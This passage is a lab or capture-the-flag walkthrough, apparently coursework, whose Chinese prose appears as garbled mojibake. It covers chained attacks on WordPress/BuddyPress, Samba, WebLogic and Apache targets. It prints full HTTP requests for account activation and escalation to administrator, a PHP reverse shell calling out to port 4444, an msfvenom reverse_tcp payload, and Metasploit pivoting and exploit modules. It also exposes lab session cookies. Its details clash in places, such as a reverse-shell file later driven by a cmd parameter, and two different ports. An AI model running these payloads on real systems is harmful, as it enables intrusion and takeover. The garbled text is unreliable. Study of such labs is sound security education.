   - ä½¿ç”¨ Burp Suite æŠ“åŒ…ã€‚
   ![1747897930858](image/readme/1747897930858.png)
   - ç‚¹å‡»`send to repeater`ï¼Œæ„é€  POST è¯·æ±‚ï¼Œå‘é€åˆ° `/wp-json/buddypress/v1/signup`ã€‚
   - è¯·æ±‚ä½“å¦‚ä¸‹ï¼š
     ```json
     {
       "user_login": "attacker1",
       "user_email": "attacker1@163.com",
       "user_name": "attacker1",
       "password": "attacker1"
     }
     ```
    - æœ€ç»ˆæ„é€ çš„è¯·æ±‚åŒ…ï¼š
        ```
        POST /wp-json/buddypress/v1/signup HTTP/1.1
        Host: 192.168.20.12:10459
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0
        Accept: */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
        Content-Type: application/json; charset=UTF-8
        Content-Length: 112

        {"user_login": "attcker1", "user_email": "attacker1@163.com", "user_name": "attacker1", "password": "attacker1"}
        ```

    - æ›¿æ¢ `Host` ä¸ºè‡ªå·±çš„ IP å’Œç«¯å£ã€‚
    - å¾—åˆ°å›æ˜¾:
        ```
         HTTP/1.1 200 OK
         Date: Thu, 22 May 2025 03:48:36 GMT
         Server: Apache/2.4.18 (Ubuntu)
         X-Robots-Tag: noindex
         Link: <http://192.168.20.12:10459/wp-json/>; rel="https://api.w.org/"
         X-Content-Type-Options: nosniff
         Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
         Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
         Allow: POST
         Content-Length: 280
         Content-Type: application/json; charset=UTF-8
         [{"id":3,"user_login":"attcker1","registered":"2025-05-22T03:48:36","user_name":"attacker1","activation_key":"aoM0svmO72kVVPbNxYadAKifjIUuYqj8","user_email":"attacker1@163.com","date_sent":"2025-05-22T03:48:36","count_sent":1,"meta":{"field_1":"attacker1","profile_field_ids":1}}]
         ```
2. **æå–æ¿€æ´»å¯†é’¥**
   - å‘é€è¯·æ±‚åï¼ŒæœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸ªå“åº”åŒ…ï¼Œå…¶ä¸­åŒ…å« `activation_key`ã€‚
   ![1747885758997](image/homework/1747885758997.png)
   `activation_key` : `aoM0svmO72kVVPbNxYadAKifjIUuYqj8`
   - æå– `activation_key`ï¼Œç”¨äºåç»­çš„æ¿€æ´»æ“ä½œã€‚

3. **æ„é€ æ¿€æ´»è¯·æ±‚**
   - ä½¿ç”¨æå–çš„ `activation_key` æ„é€  PUT è¯·æ±‚ï¼Œå‘é€åˆ° `/wp-json/buddypress/v1/signup/activate/<activation_key>`ã€‚
   ![1747885790638](image/homework/1747885790638.png)
   - è¯·æ±‚ä½“ä¸æ³¨å†Œè¯·æ±‚ç›¸åŒã€‚
   - å®Œæ•´è¯·æ±‚åŒ…ï¼š
        ```
        PUT /wp-json/buddypress/v1/signup/activate/aoM0svmO72kVVPbNxYadAKifjIUuYqj8 HTTP/1.1
        Host:192.168.20.12:10459
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0
        Accept: */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
        Content-Type: application/json; charset=UTF-8
        Content-Length: 112
        {"user_login": "attcker1", "user_email": "attacker1@163.com", "user_name": "attacker1", "password": "attacker1"}
        ```
    - **å¾—åˆ°å›æ˜¾:**
        ```
        HTTP/1.1 200 OK
        Date: Thu, 22 May 2025 03:49:29 GMT
        Server: Apache/2.4.18 (Ubuntu)
        X-Robots-Tag: noindex
        Link: <http://192.168.20.12:10459/wp-json/>; rel="https://api.w.org/"
        X-Content-Type-Options: nosniff
        Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
        Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
        Content-Length: 280
        Content-Type: application/json; charset=UTF-8
        [{"id":3,"user_login":"attcker1","registered":"2025-05-22T03:48:36","user_name":"attacker1","activation_key":"aoM0svmO72kVVPbNxYadAKifjIUuYqj8","user_email":"attacker1@163.com","date_sent":"2025-05-22T03:48:36","count_sent":1,"meta":{"field_1":"attacker1","profile_field_ids":1}}]
        ```

4. **ç™»å½•éªŒè¯**
   - ä½¿ç”¨æ³¨å†Œçš„è´¦å· `attacker1` å’Œå¯†ç  `attacker1` ç™»å½•ã€‚
   
   ![1747885902130](image/homework/1747885902130.png)
   - ç™»å½•åï¼Œç”¨æˆ·å°†è·å¾—æ™®é€šç”¨æˆ·æƒé™ï¼Œä½†å°šæœªè·å¾—ç®¡ç†å‘˜æƒé™ã€‚
   ![1747885938881](image/homework/1747885938881.png)
   ![1748069641307](image/readme/1748069641307.png)

#### ï¼ˆä¸‰ï¼‰è·å–ç®¡ç†å‘˜æƒé™
1. **åˆ›å»ºç”¨æˆ·ç»„**
   - è®¿é—® `http://<your_ip>:<your_port>/groups/create/step/group-details/`ã€‚
   - å¡«å†™ç»„ä¿¡æ¯å¹¶å®Œæˆåˆ›å»ºã€‚
   - é€šè¿‡åˆ›å»ºç”¨æˆ·ç»„ï¼Œç”¨æˆ·å°†è¢«æ·»åŠ åˆ°è¯¥ç»„ä¸­ï¼Œä¸ºåç»­çš„æƒé™æå‡åšå‡†å¤‡ã€‚
    ![1747888798026](image/homework/1747888798026.png)
    ![1747888866380](image/homework/1747888866380.png)
    ![1747888878196](image/homework/1747888878196.png)
    ![1747888898177](image/homework/1747888898177.png)
    ![1747888916532](image/homework/1747888916532.png)
    ![1747888936571](image/homework/1747888936571.png)
2. **æŠ“å–å…³é”®å‚æ•°**
   - ç‚¹å‡» `manage`ï¼Œå†ç‚¹å‡» `members`ï¼Œä½¿ç”¨æŠ“åŒ…å·¥å…·æŠ“å–è¯·æ±‚ã€‚
   - æå–è¯·æ±‚ä¸­çš„ `X-WP-Nonce` å’Œ `Cookie` å‚æ•°ã€‚
   ![1747889012605](image/homework/1747889012605.png)
    **cookie:**
        ```
        grafana_session=7cee305b146bf89decccac3eb414687f; grafana_session_expiry=1747723015; zbx_sessionid=060b0abb1800d98452c40e735dbb58fa; wp-settings-time-2=1747822280; experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqZzRZVGcyWlRWakxUa3dZamN0TkRNMFl5MDVaREF4TFdZME5EZ3haVFptTVdNd01TST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--a69a8d8efbbef8037dbb261a0526aae27fb6c1b8; metabase.DEVICE=0af33864-c7aa-43fd-89aa-287250f4c715; vue_admin_template_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzQ3OTY5MjYzLCJlbWFpbCI6IiJ9.C9VdlIBrcP4xj1g5TzsBWQosumWuAVXLH1S6Lgzk8nI; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_8232bb51e9fa6ae4bed9f94b4ce661c2=attcker1%7C1748062618%7CGvjHpcyFfFhCylwuqLNafXmiHwJqmZ5VldxGcUkR0Bz%7Ca6226440d0bde4fe9d4cf14cce8fcf49dd365c9f342c5296f67044f265433248; wp-settings-time-3=1747889821
        ```
        **X-WP-Nonce:** ``cb16f80772``

3. **æ„é€ ææƒè¯·æ±‚**
   - ä½¿ç”¨æå–çš„ `X-WP-Nonce` å’Œ `Cookie` æ„é€  POST è¯·æ±‚ï¼Œå‘é€åˆ° `/wp-json/buddypress/v1/members/me`ã€‚
   - è¯·æ±‚ä½“å¦‚ä¸‹ï¼š
     ```json
     {"roles": "administrator"}
     ```
   - å®Œæ•´è¯·æ±‚åŒ…ï¼š
        ```http
        POST /wp-json/buddypress/v1/members/me HTTP/1.1
        Host:192.168.20.12:10459
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0
        Accept: */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
        X-WP-Nonce: cb16f80772
        Cookie: grafana_session=7cee305b146bf89decccac3eb414687f; grafana_session_expiry=1747723015; zbx_sessionid=060b0abb1800d98452c40e735dbb58fa; wp-settings-time-2=1747822280; experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqZzRZVGcyWlRWakxUa3dZamN0TkRNMFl5MDVaREF4TFdZME5EZ3haVFptTVdNd01TST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--a69a8d8efbbef8037dbb261a0526aae27fb6c1b8; metabase.DEVICE=0af33864-c7aa-43fd-89aa-287250f4c715; vue_admin_template_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzQ3OTY5MjYzLCJlbWFpbCI6IiJ9.C9VdlIBrcP4xj1g5TzsBWQosumWuAVXLH1S6Lgzk8nI; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_8232bb51e9fa6ae4bed9f94b4ce661c2=attcker1%7C1748062618%7CGvjHpcyFfFhCylwuqLNafXmiHwJqmZ5VldxGcUkR0Bz%7Ca6226440d0bde4fe9d4cf14cce8fcf49dd365c9f342c5296f67044f265433248; wp-settings-time-3=1747889821SS
        Content-Type: application/json; charset=UTF-8
        Content-Length: 28
        {"roles": "administrator"}
        ```
     ![1747890470194](image/homework/1747890470194.png)
     ![1747890494107](image/homework/1747890494107.png)

4. **éªŒè¯ææƒç»“æœ**
   - å‘é€è¯·æ±‚åï¼Œç”¨æˆ·è§’è‰²å°†è¢«æå‡ä¸ºç®¡ç†å‘˜ã€‚
   - å†æ¬¡ç™»å½• WordPress åå°ï¼ŒéªŒè¯æ˜¯å¦è·å¾—ç®¡ç†å‘˜æƒé™ï¼Œå‘ç° dashboard é¡µé¢åŠŸèƒ½å¢åŠ ã€‚
   ![1747890528150](image/homework/1747890528150.png)

#### ï¼ˆå››ï¼‰ä¸Šä¼ æœ¨é©¬ï¼Œè·å– Shell
1. **ä¸Šä¼ æœ¨é©¬æ–‡ä»¶**
   - åœ¨ WordPress åå°ï¼Œç‚¹å‡» `Plugins` æ¨¡å—ï¼Œé€‰æ‹© `Add New`ã€‚
   ![1747890547884](image/homework/1747890547884.png)
   ![1747890578223](image/homework/1747890578223.png)
   - ç‚¹å‡» `Upload Plugin`ï¼Œä¸Šä¼ åŒ…å«ä¸€å¥è¯æœ¨é©¬çš„ PHP æ–‡ä»¶ã€‚
   ![1747890605964](image/homework/1747890605964.png)
   - æœ¨é©¬æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š
        ```php
        <?php
        $sock = fsockopen("192.168.168.10", 4444);
        $proc = proc_open("bash -i", array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
        ?>
        ```
        ![1747890820999](image/homework/1747890820999.png)
2. **éªŒè¯æœ¨é©¬æ‰§è¡Œ**
   - ä¸Šä¼ æˆåŠŸåï¼Œè®¿é—® `/wp-content/uploads/<year>/<month>/c.php`ã€‚
    ![1747890861599](image/homework/1747890861599.png)
    ![1747890872341](image/homework/1747890872341.png)
   **ç¬¬ä¸€ç§æ–¹æ³• :**
      - é€šè¿‡ URL å‚æ•° `cmd` æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œä¾‹å¦‚ï¼š
         ```
         http://<your_ip>:<your_port>/wp-content/uploads/2025/05/c.php?cmd=id
         ```
      - å¦‚æœè¿”å›ç”¨æˆ· ID ä¿¡æ¯ï¼Œåˆ™è¯´æ˜æœ¨é©¬æ‰§è¡ŒæˆåŠŸï¼Œè·å¾—äº† Shellã€‚
      ![1747891827132](image/homework/1747891827132.png)
      ![1747891841145](image/homework/1747891841145.png)
      - ç”±æ­¤,æˆ‘ä»¬æ‰¾åˆ°/tmpç›®å½•ä¸‹çš„flag,å°†å…¶è¾“å…¥åˆ°åœºæ™¯flagä¸­,æˆåŠŸå¾—åˆ†
      flagä¸º`flag-{bmh9a8fd407-0aac-4b54-995d-4bb306a739f5}`
      ![1747891890594](image/homework/1747891890594.png)
   **ç¬¬äºŒç§æ–¹æ³• :**
      - æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨ metasploit è·å–åå¼¹ shell
      ![1747893446502](image/homework/1747893446502.png)
      ![1747893462723](image/homework/1747893462723.png)


### æ­¥éª¤äºŒ è®¾ç«‹ç«‹è¶³ç‚¹å¹¶å‘ç°é¶æ ‡2-3

1. åœ¨æ”»å‡»è€…ä¸»æœºä¸Šç”Ÿæˆmeterpreter.elfæ–‡ä»¶
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<æ”»å‡»è€…ä¸»æœºIP> LPORT=<ç«¯å£> -f elf > meterpreter.elf`ï¼Œé€šè¿‡ä¸Šä¸€å±‚æ”»å‡»ä¸­æ¶‰åŠçš„æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¸Šä¼ æˆ‘ä»¬çš„meterpreter.elfæ–‡ä»¶ã€‚
<br>![](./pics/æ‰‹åŠ¨ç”Ÿæˆmeterpretershell.png)<br>
2. ä¸Šä¼ æ–‡ä»¶ï¼ˆè¦æ±‚å®Œæˆå…¥å£é¶æ ‡çš„ææƒè¡Œä¸ºï¼‰
![](./pics/ä¸Šä¼ æˆåŠŸ.png)<br>

3. æ”»å‡»è€…ä¸»æœºï¼Œåœ¨metasploité‡Œè®¾ç½®å¦‚ä¸‹å¹¶`run -j`ç­‰å¾…

```bash
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set lhost <æ”»å‡»è€…ä¸»æœºIP>
set lport <ç«¯å£>
run -j
```

æ³¨æ„ï¼Œè¿™é‡Œçš„IPå’Œç«¯å£è¦å’Œç”Ÿæˆ.elfæ–‡ä»¶æ—¶è®¾ç½®çš„ä¸€æ ·

5. åœ¨é¶æœºä¸Šè¿›å…¥å…¥å£é¶æ ‡çš„å®¹å™¨ï¼Œåœ¨é¶æœºé‡Œè¿è¡Œmeterpreter.elf
![](./pics/è¿›å…¥å®¹å™¨ä¸‹è½½æ–‡ä»¶å¹¶è¿è¡Œ.png)<br>

6. è¿”å›åˆ°æ”»å‡»è€…ä¸»æœºï¼Œå¯ä»¥çœ‹åˆ°è¿æ¥æˆåŠŸ
![](./pics/æ‹¿åˆ°meterpretershell.png)<br>

7. å‡çº§shell
`sessions -u <ä¼šè¯ç¼–å·>`
![](./pics/å‡çº§ä¼šè¯çª—å£.png)<br>

8. è¿›å…¥æ–°å¼€å¯çš„ä¼šè¯ï¼ŒæŸ¥çœ‹routeï¼Œarpï¼Œ ipconfig
`sessions -i <ä¼šè¯ç¼–å·>`
![](./pics/æŸ¥çœ‹arp.png)<br>
![](./pics/æŸ¥çœ‹route.png)<br>
![](./pics/ipconfig.png)<br>

9. è®¾ç½®pivotè·¯ç”±
![](./pics/æ·»åŠ pivotè·¯ç”±3.png)<br>

10. æ‰«æ
```bash
search portscan
use 0
set rhosts <ip>
set ports <ports>
set threads 10
run
```
![](./pics/æ‰«æç»“æœ1.png)<br>
æ‰«æ100%åæŸ¥çœ‹å­˜æ´»çš„ä¸»æœºå’ŒæœåŠ¡ï¼Œä½¿ç”¨`hosts`å’Œ`services`
![](./pics/å¼€æ”¾çš„ä¸»æœºå’ŒæœåŠ¡.png)<br>

11. è®¾ç½®ä»£ç†
å‚ç…§[æ•™å­¦è¯¾ä»¶](https://c4pr1c3.github.io/cuc-ns-ppt/vuls-awd.md.v4.html#/%E5%BB%BA%E7%AB%8B%E7%AB%8B%E8%B6%B3%E7%82%B9%E5%B9%B6%E5%8F%91%E7%8E%B0%E9%9D%B6%E6%A0%872-4)å’Œè§†é¢‘
![](./pics/socksä»£ç†.png)<br>
![](./pics/æŸ¥çœ‹1080ç«¯å£æœåŠ¡å¼€æ”¾æƒ…å†µ.png)<br>
`cat /etc/proxychains4.conf` 
ç¡®è®¤æœ‰ä»¥ä¸‹é…ç½®
![](./pics/ä¿®æ”¹proxychainsé…ç½®.png)<br>
å¹¶ä¸”é…ç½®æµè§ˆå™¨ä»£ç†,æ–¹ä¾¿ç›´æ¥ä»æµè§ˆå™¨è®¿é—®ç½‘é¡µ
![](./pics/ä»£ç†3.png)<br>

### æ­¥éª¤ä¸‰ é¶æ ‡2-3æ”»ç ´

#### samba
* Sambaæ˜¯åœ¨Linuxå’ŒUNIXç³»ç»Ÿä¸Šå®ç°SMBåè®®çš„ä¸€ä¸ªå…è´¹è½¯ä»¶ï¼Œç”±æœåŠ¡å™¨åŠå®¢æˆ·ç«¯ç¨‹åºæ„æˆã€‚SMBï¼ˆServer Messages Blockï¼Œä¿¡æ¯æœåŠ¡å—ï¼‰æ˜¯ä¸€ç§åœ¨å±€åŸŸç½‘ä¸Šå…±äº«æ–‡ä»¶å’Œæ‰“å°æœºçš„ä¸€ç§é€šä¿¡åè®®ï¼Œå®ƒä¸ºå±€åŸŸç½‘å†…çš„ä¸åŒè®¡ç®—æœºä¹‹é—´æä¾›æ–‡ä»¶åŠæ‰“å°æœºç­‰èµ„æºçš„å…±äº«æœåŠ¡ã€‚SMBåè®®æ˜¯å®¢æˆ·æœº/æœåŠ¡å™¨å‹åè®®ï¼Œå®¢æˆ·æœºé€šè¿‡è¯¥åè®®å¯ä»¥è®¿é—®æœåŠ¡å™¨ä¸Šçš„å…±äº«æ–‡ä»¶ç³»ç»Ÿã€æ‰“å°æœºåŠå…¶ä»–èµ„æºã€‚é€šè¿‡è®¾ç½®â€œNetBIOS over TCP/IPâ€ä½¿å¾—Sambaä¸ä½†èƒ½ä¸å±€åŸŸç½‘ç»œä¸»æœºåˆ†äº«èµ„æºï¼Œè¿˜èƒ½ä¸å…¨ä¸–ç•Œçš„ç”µè„‘åˆ†äº«èµ„æºã€‚

* 2017å¹´5æœˆ24æ—¥Sambaå‘å¸ƒäº†4.6.4ç‰ˆæœ¬ï¼Œä¸­é—´ä¿®å¤äº†ä¸€ä¸ªä¸¥é‡çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œæ¼æ´ç¼–å·CVE-2017-7494ï¼Œæ¼æ´å½±å“äº†Samba 3.5.0 ä¹‹ååˆ°4.6.4/4.5.10/4.4.14ä¸­é—´çš„æ‰€æœ‰ç‰ˆæœ¬,ï¼Œç¡®è®¤å±äºä¸¥é‡æ¼æ´ï¼Œå¯ä»¥é€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œã€‚

1. æ ¹æ®æ‰«æç»“æœæœç´¢å¯ç”¨æ”»å‡»æ¨¡å—å¹¶é€‰æ‹©åˆé€‚çš„æ¨¡å—ï¼Œè®¾ç½®åˆé€‚çš„optionsï¼Œè¿›è¡Œæ”»å‡»

```bash
search semba type:exploit
use exploit/linux/samba/is_know_pipname
# è®¾ç½®optionsï¼Œå¯ä»¥ä½¿ç”¨show optionsæŸ¥çœ‹éœ€è¦è®¾ç½®çš„å†…å®¹
# æ‰§è¡Œæ”»å‡»
run
```

![alt text](./pics/meta-samba.png)

2. get flag

![](./pics/getflag3.png)<br>

#### nginx

1. è®¾ç½®ä»£ç†curlæ‰«æåˆ°çš„IP
`proxychains curl http://192.170.84.2`
![](./pics/è®¿é—®ç¬¬äºŒå°ä¸»æœº.png)<br>

2. æ ¹æ®æç¤ºæ‰§è¡Œä»¥ä¸‹å‘½ä»¤
`proxychains curl http://<ç›®æ ‡IP>/index.php?cmd=ls%20/tmp`
![](./pics/ç¬¬äºŒä¸ªflag.png)<br>



### æ­¥éª¤å›› è®¾ç«‹pivotè·¯ç”±å¹¶å‘ç°é¶æ ‡4-5

1. æŸ¥çœ‹ç¬¬ä¸€å±‚ä¸¤å°ä¸»æœºçš„ip

![](./pics/åŒç½‘å¡1.png)<br>
å¯ä»¥çœ‹åˆ°192.170.84.4è¿™ä¸€å°æœºå™¨æœ‰åŒç½‘å¡

2. å‡çº§å¯¹åº”çš„shell
![](./pics/å‡çº§shell1.png)<br>

3. è®¾ç½®pivotè·¯ç”±
![](./pics/æ·»åŠ pivotè·¯ç”±3.png)<br>

### æ­¥éª¤äº” é¶æ ‡4-5æ”»ç ´

#### weblogic

```bash
search cve-2019-2725
use 0
set Proxies socks5:127.0.0.1:1080
# è®¾ç½®é¶æœºIPç­‰
# ä¾‹ï¼š
# set rhosts 192.169.85.3
# è®¾ç½®å®Œæˆä»¥åå†è¿›è¡Œæ”»å‡»
run
```
ä¼šè¯çª—å£å¼€å¯ä»¥åï¼Œè¿›å…¥shellï¼Œè¾“å…¥ls /tmp
![](./pics/æ‹¿åˆ°flag3.png)

#### apache

#### 1. å¯åŠ¨é¶æœºç¯å¢ƒ

![1748153067964](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748153067964.png)

#### 2. ä¿¡æ¯æ”¶é›†

##### 2.1 åŸºç¡€ç«¯å£æ‰«æ

```bash
# æ‰«æ Apache æœåŠ¡ç«¯å£
nmap -sV -p 80,443,8080-8090 10.37.133.3
```

**æ‰«æç»“æœ**:

```
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ nmap -sV -p 80,443,8080-8090 10.37.133.3

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-25 02:03 EDT
Nmap scan report for kali-linux.host-only--3 (10.37.133.3)
Host is up (0.0000020s latency).

PORT     STATE    SERVICE         VERSION
80/tcp   filtered http
443/tcp  closed   https
8080/tcp closed   http-proxy
8081/tcp closed   blackice-icecap
8082/tcp closed   blackice-alerts
8083/tcp closed   us-srv
8084/tcp closed   websnp
8085/tcp closed   unknown
8086/tcp closed   d-s-n
8087/tcp closed   simplifymedia
8088/tcp closed   radan-http
8089/tcp closed   unknown
8090/tcp closed   opsmessaging

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.43 seconds
```

![1748153021142](./image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748153021142.png)

**æ‰«æç»“æœåˆ†æ**ï¼š

- å¸¸è§„HTTPç«¯å£(80, 443, 8080-8090)å‡æ˜¾ç¤ºä¸ºå…³é—­æˆ–è¿‡æ»¤çŠ¶æ€
- ApacheæœåŠ¡è¿è¡Œåœ¨éæ ‡å‡†ç«¯å£ä¸Šï¼Œé€šè¿‡Vulfocuså¹³å°åŠ¨æ€åˆ†é…ä¸º**13503ç«¯å£**
- éœ€è¦ç›´æ¥è®¿é—®æŒ‡å®šçš„æ˜ å°„ç«¯å£è¿›è¡Œåç»­ä¿¡æ¯æ”¶é›†

##### 2.2 Web æœåŠ¡è¯†åˆ«

é€šè¿‡æµè§ˆå™¨è®¿é—® Apache æœåŠ¡ `http://10.37.133.3:42286`ã€‚

![1748152989670](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748152989670.png)

##### 2.3 Apache ç‰ˆæœ¬æ£€æµ‹

```bash
# ä½¿ç”¨ curl è·å–æœåŠ¡å™¨ä¿¡æ¯
curl -I http://10.37.133.3:42286

# ä½¿ç”¨ nikto è¿›è¡Œ Web æ‰«æ
nikto -h http://10.37.133.3:42286
```

![1748153862204](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748153862204.png)

**curlå“åº”å¤´åˆ†æ**:

```bash
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ curl -I http://10.37.133.3:42286

HTTP/1.1 200 OK
Date: Sun, 25 May 2025 06:04:51 GMT
Server: Apache/2.4.49 (Debian)
Last-Modified: Sat, 09 Oct 2021 03:58:16 GMT
ETag: "29cd-5cde381698600"
Accept-Ranges: bytes
Content-Length: 10701
Vary: Accept-Encoding
Content-Type: text/html
```

**å…³é”®å‘ç°**ï¼š

- **æœåŠ¡å™¨ç‰ˆæœ¬**: `Apache/2.4.49 (Debian)` - **è¿™æ­£æ˜¯CVE-2021-41773æ¼æ´å½±å“çš„ç¡®åˆ‡ç‰ˆæœ¬**
- **æ“ä½œç³»ç»Ÿ**: Debian Linux
- **æ–‡ä»¶ä¿®æ”¹æ—¶é—´**: 2021-10-09ï¼Œä¸CVEæŠ«éœ²æ—¶é—´å»åˆ
- **å“åº”æ­£å¸¸**: HTTP 200çŠ¶æ€ç ï¼ŒæœåŠ¡å™¨æ­£å¸¸è¿è¡Œ

##### 2.4 Nikto å®‰å…¨æ‰«æ

**niktoæ‰«æç»“æœ**:
![1748153891702](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748153891702.png)

```bash
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ nikto -h http://10.37.133.3:42286

- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.37.133.3
+ Target Hostname:    10.37.133.3
+ Target Port:        42286
+ Start Time:         2025-05-25 02:04:56 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.49 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present.
+ /: The X-Content-Type-Options header is not set.
+ Apache/2.4.49 appears to be outdated (current is at least Apache/2.4.54).
+ /: Server may leak inodes via ETags, header found with file /, inode: 29cd, size: 5cde381698600, mtime: gzip.
+ OPTIONS: Allowed HTTP Methods: POST, OPTIONS, HEAD, GET .
+ 8909 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2025-05-25 02:05:04 (GMT-4) (8 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

**Niktoæ‰«æåˆ†æ**ï¼š

- **ç‰ˆæœ¬ç¡®è®¤**: å†æ¬¡ç¡®è®¤Apache/2.4.49ç‰ˆæœ¬ï¼Œ**æ˜ç¡®æ ‡æ³¨ä¸ºè¿‡æ—¶ç‰ˆæœ¬**
- **å®‰å…¨é…ç½®ç¼ºé™·**:
  - ç¼ºå°‘ `X-Frame-Options`å¤´(ç‚¹å‡»åŠ«æŒé˜²æŠ¤)
  - ç¼ºå°‘ `X-Content-Type-Options`å¤´(MIMEç±»å‹å—…æ¢é˜²æŠ¤)
- **ä¿¡æ¯æ³„éœ²**: ETagå¤´å¯èƒ½æ³„éœ²æœåŠ¡å™¨inodeä¿¡æ¯
- **HTTPæ–¹æ³•**: æ”¯æŒPOST, OPTIONS, HEAD, GETæ–¹æ³•
- **é‡è¦**: æ‰«æè¿‡ç¨‹ä¸­æœªè§¦å‘æ˜æ˜¾çš„å®‰å…¨æ‹¦æˆªï¼Œè¯´æ˜æœåŠ¡å™¨é…ç½®ç›¸å¯¹å®½æ¾

##### 2.5 ç›®å½•ç»“æ„æ¢æµ‹

```bash
# ä½¿ç”¨ dirb è¿›è¡Œç›®å½•æ‰«æ
dirb http://10.37.133.3:42286
```

**dirbæ‰«æç»“æœ**:
![1748153913104](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748153913104.png)

```bash
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ dirb http://10.37.133.3:42286

-----------------
DIRB v2.22  
By The Dark Raver
-----------------

START_TIME: Sun May 25 02:05:11 2025
URL_BASE: http://10.37.133.3:42286/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                    

---- Scanning URL: http://10.37.133.3:42286/ ----
+ http://10.37.133.3:42286/cgi-bin/ (CODE:403|SIZE:279)                                                                                                                                        
+ http://10.37.133.3:42286/index.html (CODE:200|SIZE:10701)                                                                                                                                    
+ http://10.37.133.3:42286/server-status (CODE:403|SIZE:279)                                                                                                                                   
                                                                                                                                                                                               
-----------------
END_TIME: Sun May 25 02:05:12 2025
DOWNLOADED: 4612 - FOUND: 3
```

**ç›®å½•å‘ç°åˆ†æ**ï¼š

- **`/cgi-bin/` (403 Forbidden)**: **å…³é”®å‘ç°** - è¿™æ˜¯CVE-2021-41773æ¼æ´åˆ©ç”¨çš„æ ¸å¿ƒè·¯å¾„
  - 403çŠ¶æ€è¡¨æ˜ç›®å½•å­˜åœ¨ä½†è®¿é—®è¢«é™åˆ¶
  - CGIç›®å½•çš„å­˜åœ¨ä¸ºè·¯å¾„éå†æ”»å‡»æä¾›äº†å…¥å£ç‚¹
- **`/index.html` (200 OK)**: æ ‡å‡†é¦–é¡µæ–‡ä»¶ï¼Œå¤§å°10701å­—èŠ‚
- **`/server-status` (403 Forbidden)**: ApacheçŠ¶æ€é¡µé¢ï¼Œè¢«ä¿æŠ¤ä½†å­˜åœ¨

##### 2.6 ä¿¡æ¯æ”¶é›†æ€»ç»“

1. **æ¼æ´ç¡®è®¤**:

